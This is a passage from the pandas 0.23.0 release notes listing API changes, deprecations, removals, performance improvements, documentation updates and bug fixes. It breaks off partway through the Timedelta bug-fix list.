[9]: index = pd.UInt64Index([0, 1])\n\n    In [10]: index / np.array([0, 0], dtype=np.uint64)\n    Out[10]: UInt64Index([0, 0], dtype='uint64')\n\n    In [11]: pd.RangeIndex(1, 5) / 0\n    ZeroDivisionError: integer division or modulo by zero\n\nCurrent behavior:\n\n.. code-block:: ipython\n\n    In [12]: index = pd.Int64Index([-1, 0, 1])\n     division by zero gives -infinity where negative,\n     +infinity where positive, and NaN for 0 / 0\n    In [13]: index / 0\n\n     The result of division by zero should not depend on\n     whether the zero is int or float\n    In [14]: index / 0.0\n\n    In [15]: index = pd.UInt64Index([0, 1])\n    In [16]: index / np.array([0, 0], dtype=np.uint64)\n\n    In [17]: pd.RangeIndex(1, 5) / 0\n\n.. _whatsnew_0230.api_breaking.extract:\n\nExtraction of matching patterns from strings\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nBy default, extracting matching patterns from strings with :func:`str.extract` used to return a\n``Series`` if a single group was being extracted (a ``DataFrame`` if more than one group was\nextracted). As of pandas 0.23.0 :func:`str.extract` always returns a ``DataFrame``, unless\n``expand`` is set to ``False``. Finally, ``None`` was an accepted value for\nthe ``expand`` parameter (which was equivalent to ``False``), but now raises a ``ValueError``. (:issue:`11386`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n    In [1]: s = pd.Series(['number 10', '12 eggs'])\n\n    In [2]: extracted = s.str.extract(r'.*(\\d\\d).*')\n\n    In [3]: extracted\n    Out [3]:\n    0    10\n    1    12\n    dtype: object\n\n    In [4]: type(extracted)\n    Out [4]:\n    pandas.core.series.Series\n\nNew behavior:\n\n.. ipython:: python\n\n    s = pd.Series(['number 10', '12 eggs'])\n    extracted = s.str.extract(r'.*(\\d\\d).*')\n    extracted\n    type(extracted)\n\nTo restore previous behavior, simply set ``expand`` to ``False``:\n\n.. ipython:: python\n\n    s = pd.Series(['number 10', '12 eggs'])\n    extracted = s.str.extract(r'.*(\\d\\d).*', expand=False)\n    extracted\n    type(extracted)\n\n.. _whatsnew_0230.api_breaking.cdt_ordered:\n\nDefault value for the ``ordered`` parameter of ``CategoricalDtype``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe default value of the ``ordered`` parameter for :class:`~pandas.api.types.CategoricalDtype` has changed from ``False`` to ``None`` to allow updating of ``categories`` without impacting ``ordered``.  Behavior should remain consistent for downstream objects, such as :class:`Categorical` (:issue:`18790`)\n\nIn previous versions, the default value for the ``ordered`` parameter was ``False``.  This could potentially lead to the ``ordered`` parameter unintentionally being changed from ``True`` to ``False`` when users attempt to update ``categories`` if ``ordered`` is not explicitly specified, as it would silently default to ``False``.  The new behavior for ``ordered=None`` is to retain the existing value of ``ordered``.\n\nNew behavior:\n\n.. code-block:: ipython\n\n    In [2]: from pandas.api.types import CategoricalDtype\n\n    In [3]: cat = pd.Categorical(list('abcaba'), ordered=True, categories=list('cba'))\n\n    In [4]: cat\n    Out[4]:\n    [a, b, c, a, b, a]\n    Categories (3, object): [c < b < a]\n\n    In [5]: cdt = CategoricalDtype(categories=list('cbad'))\n\n    In [6]: cat.astype(cdt)\n    Out[6]:\n    [a, b, c, a, b, a]\n    Categories (4, object): [c < b < a < d]\n\nNotice in the example above that the converted ``Categorical`` has retained ``ordered=True``.  Had the default value for ``ordered`` remained as ``False``, the converted ``Categorical`` would have become unordered, despite ``ordered=False`` never being explicitly specified.  To change the value of ``ordered``, explicitly pass it to the new dtype, e.g. ``CategoricalDtype(categories=list('cbad'), ordered=False)``.\n\nNote that the unintentional conversion of ``ordered`` discussed above did not arise in previous versions due to separate bugs that prevented ``astype`` from doing any type of category to category conversion (:issue:`10696`, :issue:`18593`).  These bugs have been fixed in this release, and motivated changing the default value of ``ordered``.\n\n.. _whatsnew_0230.api_breaking.pretty_printing:\n\nBetter pretty-printing of DataFrames in a terminal\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nPreviously, the default value for the maximum number of columns was\n``pd.options.display.max_columns=20``. This meant that relatively wide data\nframes would not fit within the terminal width, and pandas would introduce line\nbreaks to display these 20 columns. This resulted in an output that was\nrelatively difficult to read:\n\n.. image:: ../_static/print_df_old.png\n\nIf Python runs in a terminal, the maximum number of columns is now determined\nautomatically so that the printed data frame fits within the current terminal\nwidth (``pd.options.display.max_columns=0``) (:issue:`17023`). If Python runs\nas a Jupyter kernel (such as the Jupyter QtConsole or a Jupyter notebook, as\nwell as in many IDEs), this value cannot be inferred automatically and is thus\nset to ``20`` as in previous versions. In a terminal, this results in a much\nnicer output:\n\n.. image:: ../_static/print_df_new.png\n\nNote that if you don't like the new default, you can always set this option\nyourself. To revert to the old setting, you can run this line:\n\n.. code-block:: python\n\n  pd.options.display.max_columns = 20\n\n.. _whatsnew_0230.api.datetimelike:\n\nDatetimelike API changes\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- The default ``Timedelta`` constructor now accepts an ``ISO 8601 Duration`` string as an argument (:issue:`19040`)\n- Subtracting ``NaT`` from a :class:`Series` with ``dtype='datetime64[ns]'`` returns a ``Series`` with ``dtype='timedelta64[ns]'`` instead of ``dtype='datetime64[ns]'`` (:issue:`18808`)\n- Addition or subtraction of ``NaT`` from :class:`TimedeltaIndex` will return ``TimedeltaIndex`` instead of ``DatetimeIndex`` (:issue:`19124`)\n- :func:`DatetimeIndex.shift` and :func:`TimedeltaIndex.shift` will now raise ``NullFrequencyError`` (which subclasses ``ValueError``, which was raised in older versions) when the index object frequency is ``None`` (:issue:`19147`)\n- Addition and subtraction of ``NaN`` from a :class:`Series` with ``dtype='timedelta64[ns]'`` will raise a ``TypeError`` instead of treating the ``NaN`` as ``NaT`` (:issue:`19274`)\n- ``NaT`` division with :class:`datetime.timedelta` will now return ``NaN`` instead of raising (:issue:`17876`)\n- Operations between a :class:`Series` with dtype ``dtype='datetime64[ns]'`` and a :class:`PeriodIndex` will correctly raises ``TypeError`` (:issue:`18850`)\n- Subtraction of :class:`Series` with timezone-aware ``dtype='datetime64[ns]'`` with mismatched timezones will raise ``TypeError`` instead of ``ValueError`` (:issue:`18817`)\n- :class:`Timestamp` will no longer silently ignore unused or invalid ``tz`` or ``tzinfo`` keyword arguments (:issue:`17690`)\n- :class:`Timestamp` will no longer silently ignore invalid ``freq`` arguments (:issue:`5168`)\n- :class:`CacheableOffset` and :class:`WeekDay` are no longer available in the ``pandas.tseries.offsets`` module (:issue:`17830`)\n- ``pandas.tseries.frequencies.get_freq_group()`` and ``pandas.tseries.frequencies.DAYS`` are removed from the public API (:issue:`18034`)\n- :func:`Series.truncate` and :func:`DataFrame.truncate` will raise a ``ValueError`` if the index is not sorted instead of an unhelpful ``KeyError`` (:issue:`17935`)\n- :attr:`Series.first` and :attr:`DataFrame.first` will now raise a ``TypeError``\n  rather than ``NotImplementedError`` when index is not a :class:`DatetimeIndex` (:issue:`20725`).\n- :attr:`Series.last` and :attr:`DataFrame.last` will now raise a ``TypeError``\n  rather than ``NotImplementedError`` when index is not a :class:`DatetimeIndex` (:issue:`20725`).\n- Restricted ``DateOffset`` keyword arguments. Previously, ``DateOffset`` subclasses allowed arbitrary keyword arguments which could lead to unexpected behavior. Now, only valid arguments will be accepted. (:issue:`17176`, :issue:`18226`).\n- :func:`pandas.merge` provides a more informative error message when trying to merge on timezone-aware and timezone-naive columns (:issue:`15800`)\n- For :class:`DatetimeIndex` and :class:`TimedeltaIndex` with ``freq=None``, addition or subtraction of integer-dtyped array or ``Index`` will raise ``NullFrequencyError`` instead of ``TypeError`` (:issue:`19895`)\n- :class:`Timestamp` constructor now accepts a ``nanosecond`` keyword or positional argument (:issue:`18898`)\n- :class:`DatetimeIndex` will now raise an ``AttributeError`` when the ``tz`` attribute is set after instantiation (:issue:`3746`)\n- :class:`DatetimeIndex` with a ``pytz`` timezone will now return a consistent ``pytz`` timezone (:issue:`18595`)\n\n.. _whatsnew_0230.api.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- :func:`Series.astype` and :func:`Index.astype` with an incompatible dtype will now raise a ``TypeError`` rather than a ``ValueError`` (:issue:`18231`)\n- ``Series`` construction with an ``object`` dtyped tz-aware datetime and ``dtype=object`` specified, will now return an ``object`` dtyped ``Series``, previously this would infer the datetime dtype (:issue:`18231`)\n- A :class:`Series` of ``dtype=category`` constructed from an empty ``dict`` will now have categories of ``dtype=object`` rather than ``dtype=float64``, consistently with the case in which an empty list is passed (:issue:`18515`)\n- All-NaN levels in a ``MultiIndex`` are now assigned ``float`` rather than ``object`` dtype, promoting consistency with ``Index`` (:issue:`17929`).\n- Levels names of a ``MultiIndex`` (when not None) are now required to be unique: trying to create a ``MultiIndex`` with repeated names will raise a ``ValueError`` (:issue:`18872`)\n- Both construction and renaming of ``Index``/``MultiIndex`` with non-hashable ``name``/``names`` will now raise ``TypeError`` (:issue:`20527`)\n- :func:`Index.map` can now accept ``Series`` and dictionary input objects (:issue:`12756`, :issue:`18482`, :issue:`18509`).\n- :func:`DataFrame.unstack` will now default to filling with ``np.nan`` for ``object`` columns. (:issue:`12815`)\n- :class:`IntervalIndex` constructor will raise if the ``closed`` parameter conflicts with how the input data is inferred to be closed (:issue:`18421`)\n- Inserting missing values into indexes will work for all types of indexes and automatically insert the correct type of missing value (``NaN``, ``NaT``, etc.) regardless of the type passed in (:issue:`18295`)\n- When created with duplicate labels, ``MultiIndex`` now raises a ``ValueError``. (:issue:`17464`)\n- :func:`Series.fillna` now raises a ``TypeError`` instead of a ``ValueError`` when passed a list, tuple or DataFrame as a ``value`` (:issue:`18293`)\n- :func:`pandas.DataFrame.merge` no longer casts a ``float`` column to ``object`` when merging on ``int`` and ``float`` columns (:issue:`16572`)\n- :func:`pandas.merge` now raises a ``ValueError`` when trying to merge on incompatible data types (:issue:`9780`)\n- The default NA value for :class:`UInt64Index` has changed from 0 to ``NaN``, which impacts methods that mask with NA, such as ``UInt64Index.where()`` (:issue:`18398`)\n- Refactored ``setup.py`` to use ``find_packages`` instead of explicitly listing out all subpackages (:issue:`18535`)\n- Rearranged the order of keyword arguments in :func:`read_excel()` to align with :func:`read_csv()` (:issue:`16672`)\n- :func:`wide_to_long` previously kept numeric-like suffixes as ``object`` dtype. Now they are cast to numeric if possible (:issue:`17627`)\n- In :func:`read_excel`, the ``comment`` argument is now exposed as a named parameter (:issue:`18735`)\n- Rearranged the order of keyword arguments in :func:`read_excel()` to align with :func:`read_csv()` (:issue:`16672`)\n- The options ``html.border`` and ``mode.use_inf_as_null`` were deprecated in prior versions, these will now show ``FutureWarning`` rather than a ``DeprecationWarning`` (:issue:`19003`)\n- :class:`IntervalIndex` and ``IntervalDtype`` no longer support categorical, object, and string subtypes (:issue:`19016`)\n- ``IntervalDtype`` now returns ``True`` when compared against ``'interval'`` regardless of subtype, and ``IntervalDtype.name`` now returns ``'interval'`` regardless of subtype (:issue:`18980`)\n- ``KeyError`` now raises instead of ``ValueError`` in :meth:`~DataFrame.drop`, :meth:`~Panel.drop`, :meth:`~Series.drop`, :meth:`~Index.drop` when dropping a non-existent element in an axis with duplicates (:issue:`19186`)\n- :func:`Series.to_csv` now accepts a ``compression`` argument that works in the same way as the ``compression`` argument in :func:`DataFrame.to_csv` (:issue:`18958`)\n- Set operations (union, difference...) on :class:`IntervalIndex` with incompatible index types will now raise a ``TypeError`` rather than a ``ValueError`` (:issue:`19329`)\n- :class:`DateOffset` objects render more simply, e.g. ``<DateOffset: days=1>`` instead of ``<DateOffset: kwds={'days': 1}>`` (:issue:`19403`)\n- ``Categorical.fillna`` now validates its ``value`` and ``method`` keyword arguments. It now raises when both or none are specified, matching the behavior of :meth:`Series.fillna` (:issue:`19682`)\n- ``pd.to_datetime('today')`` now returns a datetime, consistent with ``pd.Timestamp('today')``; previously ``pd.to_datetime('today')`` returned a ``.normalized()`` datetime (:issue:`19935`)\n- :func:`Series.str.replace` now takes an optional ``regex`` keyword which, when set to ``False``, uses literal string replacement rather than regex replacement (:issue:`16808`)\n- :func:`DatetimeIndex.strftime` and :func:`PeriodIndex.strftime` now return an ``Index`` instead of a numpy array to be consistent with similar accessors (:issue:`20127`)\n- Constructing a Series from a list of length 1 no longer broadcasts this list when a longer index is specified (:issue:`19714`, :issue:`20391`).\n- :func:`DataFrame.to_dict` with ``orient='index'`` no longer casts int columns to float for a DataFrame with only int and float columns (:issue:`18580`)\n- A user-defined-function that is passed to :func:`Series.rolling().aggregate() <.Rolling.aggregate>`, :func:`DataFrame.rolling().aggregate() <.Rolling.aggregate>`, or its expanding cousins, will now *always* be passed a ``Series``, rather than a ``np.array``; ``.apply()`` only has the ``raw`` keyword, see :ref:`here <whatsnew_0230.enhancements.window_raw>`. This is consistent with the signatures of ``.aggregate()`` across pandas (:issue:`20584`)\n- Rolling and Expanding types raise ``NotImplementedError`` upon iteration (:issue:`11704`).\n\n.. _whatsnew_0230.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- ``Series.from_array`` and ``SparseSeries.from_array`` are deprecated. Use the normal constructor ``Series(..)`` and ``SparseSeries(..)`` instead (:issue:`18213`).\n- ``DataFrame.as_matrix`` is deprecated. Use ``DataFrame.values`` instead (:issue:`18458`).\n- ``Series.asobject``, ``DatetimeIndex.asobject``, ``PeriodIndex.asobject`` and ``TimeDeltaIndex.asobject`` have been deprecated. Use ``.astype(object)`` instead (:issue:`18572`)\n- Grouping by a tuple of keys now emits a ``FutureWarning`` and is deprecated.\n  In the future, a tuple passed to ``'by'`` will always refer to a single key\n  that is the actual tuple, instead of treating the tuple as multiple keys. To\n  retain the previous behavior, use a list instead of a tuple (:issue:`18314`)\n- ``Series.valid`` is deprecated. Use :meth:`Series.dropna` instead (:issue:`18800`).\n- :func:`read_excel` has deprecated the ``skip_footer`` parameter. Use ``skipfooter`` instead (:issue:`18836`)\n- :meth:`ExcelFile.parse` has deprecated ``sheetname`` in favor of ``sheet_name`` for consistency with :func:`read_excel` (:issue:`20920`).\n- The ``is_copy`` attribute is deprecated and will be removed in a future version (:issue:`18801`).\n- ``IntervalIndex.from_intervals`` is deprecated in favor of the :class:`IntervalIndex` constructor (:issue:`19263`)\n- ``DataFrame.from_items`` is deprecated. Use :func:`DataFrame.from_dict` instead, or ``DataFrame.from_dict(OrderedDict())`` if you wish to preserve the key order (:issue:`17320`, :issue:`17312`)\n- Indexing a :class:`MultiIndex` or a :class:`FloatIndex` with a list containing some missing keys will now show a :class:`FutureWarning`, which is consistent with other types of indexes (:issue:`17758`).\n\n- The ``broadcast`` parameter of ``.apply()`` is deprecated in favor of ``result_type='broadcast'`` (:issue:`18577`)\n- The ``reduce`` parameter of ``.apply()`` is deprecated in favor of ``result_type='reduce'`` (:issue:`18577`)\n- The ``order`` parameter of :func:`factorize` is deprecated and will be removed in a future release (:issue:`19727`)\n- :attr:`Timestamp.weekday_name`, :attr:`DatetimeIndex.weekday_name`, and :attr:`Series.dt.weekday_name` are deprecated in favor of :meth:`Timestamp.day_name`, :meth:`DatetimeIndex.day_name`, and :meth:`Series.dt.day_name` (:issue:`12806`)\n\n- ``pandas.tseries.plotting.tsplot`` is deprecated. Use :func:`Series.plot` instead (:issue:`18627`)\n- ``Index.summary()`` is deprecated and will be removed in a future version (:issue:`18217`)\n- ``NDFrame.get_ftype_counts()`` is deprecated and will be removed in a future version (:issue:`18243`)\n- The ``convert_datetime64`` parameter in :func:`DataFrame.to_records` has been deprecated and will be removed in a future version. The NumPy bug motivating this parameter has been resolved. The default value for this parameter has also changed from ``True`` to ``None`` (:issue:`18160`).\n- :func:`Series.rolling().apply() <.Rolling.apply>`, :func:`DataFrame.rolling().apply() <.Rolling.apply>`, :func:`Series.expanding().apply() <.Expanding.apply>`, and :func:`DataFrame.expanding().apply() <.Expanding.apply>` have deprecated passing an ``np.array`` by default. One will need to pass the new ``raw`` parameter to be explicit about what is passed (:issue:`20584`)\n- The ``data``, ``base``, ``strides``, ``flags`` and ``itemsize`` properties\n  of the ``Series`` and ``Index`` classes have been deprecated and will be\n  removed in a future version (:issue:`20419`).\n- ``DatetimeIndex.offset`` is deprecated. Use ``DatetimeIndex.freq`` instead (:issue:`20716`)\n- Floor division between an integer ndarray and a :class:`Timedelta` is deprecated. Divide by :attr:`Timedelta.value` instead (:issue:`19761`)\n- Setting ``PeriodIndex.freq`` (which was not guaranteed to work correctly) is deprecated. Use :meth:`PeriodIndex.asfreq` instead (:issue:`20678`)\n- ``Index.get_duplicates()`` is deprecated and will be removed in a future version (:issue:`20239`)\n- The previous default behavior of negative indices in ``Categorical.take`` is deprecated. In a future version it will change from meaning missing values to meaning positional indices from the right. The future behavior is consistent with :meth:`Series.take` (:issue:`20664`).\n- Passing multiple axes to the ``axis`` parameter in :func:`DataFrame.dropna` has been deprecated and will be removed in a future version (:issue:`20987`)\n\n\n.. _whatsnew_0230.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Warnings against the obsolete usage ``Categorical(codes, categories)``, which were emitted for instance when the first two arguments to ``Categorical()`` had different dtypes, and recommended the use of ``Categorical.from_codes``, have now been removed (:issue:`8074`)\n- The ``levels`` and ``labels`` attributes of a ``MultiIndex`` can no longer be set directly (:issue:`4039`).\n- ``pd.tseries.util.pivot_annual`` has been removed (deprecated since v0.19). Use ``pivot_table`` instead (:issue:`18370`)\n- ``pd.tseries.util.isleapyear`` has been removed (deprecated since v0.19). Use ``.is_leap_year`` property in Datetime-likes instead (:issue:`18370`)\n- ``pd.ordered_merge`` has been removed (deprecated since v0.19). Use ``pd.merge_ordered`` instead (:issue:`18459`)\n- The ``SparseList`` class has been removed (:issue:`14007`)\n- The ``pandas.io.wb`` and ``pandas.io.data`` stub modules have been removed (:issue:`13735`)\n- ``Categorical.from_array`` has been removed (:issue:`13854`)\n- The ``freq`` and ``how`` parameters have been removed from the ``rolling``/``expanding``/``ewm`` methods of DataFrame\n  and Series (deprecated since v0.18). Instead, resample before calling the methods. (:issue:`18601` & :issue:`18668`)\n- ``DatetimeIndex.to_datetime``, ``Timestamp.to_datetime``, ``PeriodIndex.to_datetime``, and ``Index.to_datetime`` have been removed (:issue:`8254`, :issue:`14096`, :issue:`14113`)\n- :func:`read_csv` has dropped the ``skip_footer`` parameter (:issue:`13386`)\n- :func:`read_csv` has dropped the ``as_recarray`` parameter (:issue:`13373`)\n- :func:`read_csv` has dropped the ``buffer_lines`` parameter (:issue:`13360`)\n- :func:`read_csv` has dropped the ``compact_ints`` and ``use_unsigned`` parameters (:issue:`13323`)\n- The ``Timestamp`` class has dropped the ``offset`` attribute in favor of ``freq`` (:issue:`13593`)\n- The ``Series``, ``Categorical``, and ``Index`` classes have dropped the ``reshape`` method (:issue:`13012`)\n- ``pandas.tseries.frequencies.get_standard_freq`` has been removed in favor of ``pandas.tseries.frequencies.to_offset(freq).rule_code`` (:issue:`13874`)\n- The ``freqstr`` keyword has been removed from ``pandas.tseries.frequencies.to_offset`` in favor of ``freq`` (:issue:`13874`)\n- The ``Panel4D`` and ``PanelND`` classes have been removed (:issue:`13776`)\n- The ``Panel`` class has dropped the ``to_long`` and ``toLong`` methods (:issue:`19077`)\n- The options ``display.line_with`` and ``display.height`` are removed in favor of ``display.width`` and ``display.max_rows`` respectively (:issue:`4391`, :issue:`19107`)\n- The ``labels`` attribute of the ``Categorical`` class has been removed in favor of :attr:`Categorical.codes` (:issue:`7768`)\n- The ``flavor`` parameter have been removed from :func:`to_sql` method (:issue:`13611`)\n- The modules ``pandas.tools.hashing`` and ``pandas.util.hashing`` have been removed (:issue:`16223`)\n- The top-level functions ``pd.rolling_*``, ``pd.expanding_*`` and ``pd.ewm*`` have been removed (Deprecated since v0.18).\n  Instead, use the DataFrame/Series methods :attr:`~DataFrame.rolling`, :attr:`~DataFrame.expanding` and :attr:`~DataFrame.ewm` (:issue:`18723`)\n- Imports from ``pandas.core.common`` for functions such as ``is_datetime64_dtype`` are now removed. These are located in ``pandas.api.types``. (:issue:`13634`, :issue:`19769`)\n- The ``infer_dst`` keyword in :meth:`Series.tz_localize`, :meth:`DatetimeIndex.tz_localize`\n  and :class:`DatetimeIndex` have been removed. ``infer_dst=True`` is equivalent to\n  ``ambiguous='infer'``, and ``infer_dst=False`` to ``ambiguous='raise'`` (:issue:`7963`).\n- When ``.resample()`` was changed from an eager to a lazy operation, like ``.groupby()`` in v0.18.0, we put in place compatibility (with a ``FutureWarning``),\n  so operations would continue to work. This is now fully removed, so a ``Resampler`` will no longer forward compat operations (:issue:`20554`)\n- Remove long deprecated ``axis=None`` parameter from ``.replace()`` (:issue:`20271`)\n\n.. _whatsnew_0230.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Indexers on ``Series`` or ``DataFrame`` no longer create a reference cycle (:issue:`17956`)\n- Added a keyword argument, ``cache``, to :func:`to_datetime` that improved the performance of converting duplicate datetime arguments (:issue:`11665`)\n- :class:`DateOffset` arithmetic performance is improved (:issue:`18218`)\n- Converting a ``Series`` of ``Timedelta`` objects to days, seconds, etc... sped up through vectorization of underlying methods (:issue:`18092`)\n- Improved performance of ``.map()`` with a ``Series/dict`` input (:issue:`15081`)\n- The overridden ``Timedelta`` properties of days, seconds and microseconds have been removed, leveraging their built-in Python versions instead (:issue:`18242`)\n- ``Series`` construction will reduce the number of copies made of the input data in certain cases (:issue:`17449`)\n- Improved performance of :func:`Series.dt.date` and :func:`DatetimeIndex.date` (:issue:`18058`)\n- Improved performance of :func:`Series.dt.time` and :func:`DatetimeIndex.time` (:issue:`18461`)\n- Improved performance of :func:`IntervalIndex.symmetric_difference()` (:issue:`18475`)\n- Improved performance of ``DatetimeIndex`` and ``Series`` arithmetic operations with Business-Month and Business-Quarter frequencies (:issue:`18489`)\n- :func:`Series` / :func:`DataFrame` tab completion limits to 100 values, for better performance. (:issue:`18587`)\n- Improved performance of :func:`DataFrame.median` with ``axis=1`` when bottleneck is not installed (:issue:`16468`)\n- Improved performance of :func:`MultiIndex.get_loc` for large indexes, at the cost of a reduction in performance for small ones (:issue:`18519`)\n- Improved performance of :func:`MultiIndex.remove_unused_levels` when there are no unused levels, at the cost of a reduction in performance when there are (:issue:`19289`)\n- Improved performance of :func:`Index.get_loc` for non-unique indexes (:issue:`19478`)\n- Improved performance of pairwise ``.rolling()`` and ``.expanding()`` with ``.cov()`` and ``.corr()`` operations (:issue:`17917`)\n- Improved performance of :func:`.GroupBy.rank` (:issue:`15779`)\n- Improved performance of variable ``.rolling()`` on ``.min()`` and ``.max()`` (:issue:`19521`)\n- Improved performance of :func:`.GroupBy.ffill` and :func:`.GroupBy.bfill` (:issue:`11296`)\n- Improved performance of :func:`.GroupBy.any` and :func:`.GroupBy.all` (:issue:`15435`)\n- Improved performance of :func:`.GroupBy.pct_change` (:issue:`19165`)\n- Improved performance of :func:`Series.isin` in the case of categorical dtypes (:issue:`20003`)\n- Improved performance of ``getattr(Series, attr)`` when the Series has certain index types. This manifested in slow printing of large Series with a ``DatetimeIndex`` (:issue:`19764`)\n- Fixed a performance regression for :func:`GroupBy.nth` and :func:`GroupBy.last` with some object columns (:issue:`19283`)\n- Improved performance of :func:`.Categorical.from_codes` (:issue:`18501`)\n\n.. _whatsnew_0230.docs:\n\nDocumentation changes\n~~~~~~~~~~~~~~~~~~~~~\n\nThanks to all of the contributors who participated in the pandas Documentation\nSprint, which took place on March 10th. We had about 500 participants from over\n30 locations across the world. You should notice that many of the\n:ref:`API docstrings <api>` have greatly improved.\n\nThere were too many simultaneous contributions to include a release note for each\nimprovement, but this `GitHub search`_ should give you an idea of how many docstrings\nwere improved.\n\nSpecial thanks to `Marc Garcia`_ for organizing the sprint. For more information,\nread the `NumFOCUS blogpost`_ recapping the sprint.\n\n.. _GitHub search: https://github.com/pandas-dev/pandas/pulls?utf8=%E2%9C%93&q=is%3Apr+label%3ADocs+created%3A2018-03-10..2018-03-15+\n.. _NumFOCUS blogpost: https://www.numfocus.org/blog/worldwide-pandas-sprint/\n.. _Marc Garcia: https://github.com/datapythonista\n\n- Changed spelling of \"numpy\" to \"NumPy\", and \"python\" to \"Python\". (:issue:`19017`)\n- Consistency when introducing code samples, using either colon or period.\n  Rewrote some sentences for greater clarity, added more dynamic references\n  to functions, methods and classes.\n  (:issue:`18941`, :issue:`18948`, :issue:`18973`, :issue:`19017`)\n- Added a reference to :func:`DataFrame.assign` in the concatenate section of the merging documentation (:issue:`18665`)\n\n.. _whatsnew_0230.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n\n.. warning::\n\n   A class of bugs were introduced in pandas 0.21 with ``CategoricalDtype`` that\n   affects the correctness of operations like ``merge``, ``concat``, and\n   indexing when comparing multiple unordered ``Categorical`` arrays that have\n   the same categories, but in a different order. We highly recommend upgrading\n   or manually aligning your categories before doing these operations.\n\n- Bug in ``Categorical.equals`` returning the wrong result when comparing two\n  unordered ``Categorical`` arrays with the same categories, but in a different\n  order (:issue:`16603`)\n- Bug in :func:`pandas.api.types.union_categoricals` returning the wrong result\n  when for unordered categoricals with the categories in a different order.\n  This affected :func:`pandas.concat` with Categorical data (:issue:`19096`).\n- Bug in :func:`pandas.merge` returning the wrong result when joining on an\n  unordered ``Categorical`` that had the same categories but in a different\n  order (:issue:`19551`)\n- Bug in :meth:`CategoricalIndex.get_indexer` returning the wrong result when\n  ``target`` was an unordered ``Categorical`` that had the same categories as\n  ``self`` but in a different order (:issue:`19551`)\n- Bug in :meth:`Index.astype` with a categorical dtype where the resultant index is not converted to a :class:`CategoricalIndex` for all types of index (:issue:`18630`)\n- Bug in :meth:`Series.astype` and ``Categorical.astype()`` where an existing categorical data does not get updated (:issue:`10696`, :issue:`18593`)\n- Bug in :meth:`Series.str.split` with ``expand=True`` incorrectly raising an IndexError on empty strings (:issue:`20002`).\n- Bug in :class:`Index` constructor with ``dtype=CategoricalDtype(...)`` where ``categories`` and ``ordered`` are not maintained (:issue:`19032`)\n- Bug in :class:`Series` constructor with scalar and ``dtype=CategoricalDtype(...)`` where ``categories`` and ``ordered`` are not maintained (:issue:`19565`)\n- Bug in ``Categorical.__iter__`` not converting to Python types (:issue:`19909`)\n- Bug in :func:`pandas.factorize` returning the unique codes for the ``uniques``. This now returns a ``Categorical`` with the same dtype as the input (:issue:`19721`)\n- Bug in :func:`pandas.factorize` including an item for missing values in the ``uniques`` return value (:issue:`19721`)\n- Bug in :meth:`Series.take` with categorical data interpreting ``-1`` in ``indices`` as missing value markers, rather than the last element of the Series (:issue:`20664`)\n\nDatetimelike\n^^^^^^^^^^^^\n\n- Bug in :func:`Series.__sub__` subtracting a non-nanosecond ``np.datetime64`` object from a ``Series`` gave incorrect results (:issue:`7996`)\n- Bug in :class:`DatetimeIndex`, :class:`TimedeltaIndex` addition and subtraction of zero-dimensional integer arrays gave incorrect results (:issue:`19012`)\n- Bug in :class:`DatetimeIndex` and :class:`TimedeltaIndex` where adding or subtracting an array-like of ``DateOffset`` objects either raised (``np.array``, ``pd.Index``) or broadcast incorrectly (``pd.Series``) (:issue:`18849`)\n- Bug in :func:`Series.__add__` adding Series with dtype ``timedelta64[ns]`` to a timezone-aware ``DatetimeIndex`` incorrectly dropped timezone information (:issue:`13905`)\n- Adding a ``Period`` object to a ``datetime`` or ``Timestamp`` object will now correctly raise a ``TypeError`` (:issue:`17983`)\n- Bug in :class:`Timestamp` where comparison with an array of ``Timestamp`` objects would result in a ``RecursionError`` (:issue:`15183`)\n- Bug in :class:`Series` floor-division where operating on a scalar ``timedelta`` raises an exception (:issue:`18846`)\n- Bug in :class:`DatetimeIndex` where the repr was not showing high-precision time values at the end of a day (e.g., 23:59:59.999999999) (:issue:`19030`)\n- Bug in ``.astype()`` to non-ns timedelta units would hold the incorrect dtype (:issue:`19176`, :issue:`19223`, :issue:`12425`)\n- Bug in subtracting :class:`Series` from ``NaT`` incorrectly returning ``NaT`` (:issue:`19158`)\n- Bug in :func:`Series.truncate` which raises ``TypeError`` with a monotonic ``PeriodIndex`` (:issue:`17717`)\n- Bug in :func:`~DataFrame.pct_change` using ``periods`` and ``freq`` returned different length outputs (:issue:`7292`)\n- Bug in comparison of :class:`DatetimeIndex` against ``None`` or ``datetime.date`` objects raising ``TypeError`` for ``==`` and ``!=`` comparisons instead of all-``False`` and all-``True``, respectively (:issue:`19301`)\n- Bug in :class:`Timestamp` and :func:`to_datetime` where a string representing a barely out-of-bounds timestamp would be incorrectly rounded down instead of raising ``OutOfBoundsDatetime`` (:issue:`19382`)\n- Bug in :func:`Timestamp.floor` :func:`DatetimeIndex.floor` where time stamps far in the future and past were not rounded correctly (:issue:`19206`)\n- Bug in :func:`to_datetime` where passing an out-of-bounds datetime with ``errors='coerce'`` and ``utc=True`` would raise ``OutOfBoundsDatetime`` instead of parsing to ``NaT`` (:issue:`19612`)\n- Bug in :class:`DatetimeIndex` and :class:`TimedeltaIndex` addition and subtraction where name of the returned object was not always set consistently. (:issue:`19744`)\n- Bug in :class:`DatetimeIndex` and :class:`TimedeltaIndex` addition and subtraction where operations with numpy arrays raised ``TypeError`` (:issue:`19847`)\n- Bug in :class:`DatetimeIndex` and :class:`TimedeltaIndex` where setting the ``freq`` attribute was not fully supported (:issue:`20678`)\n\nTimedelta\n^^^^^^^^^\n\n- Bug in :func:`Timedelta.__mul__` where multiplying by ``NaT`` returned ``NaT`` instead of raising a ``TypeError`` (:issue:`19819`)\n- Bug in :class:`Series` with ``dtype='timedelta64[ns]'`` where addition or subtraction of ``TimedeltaIndex`` had results cast to ``dtype='int64'`` (:issue:`17250`)\n- Bug in :class:`Series` with 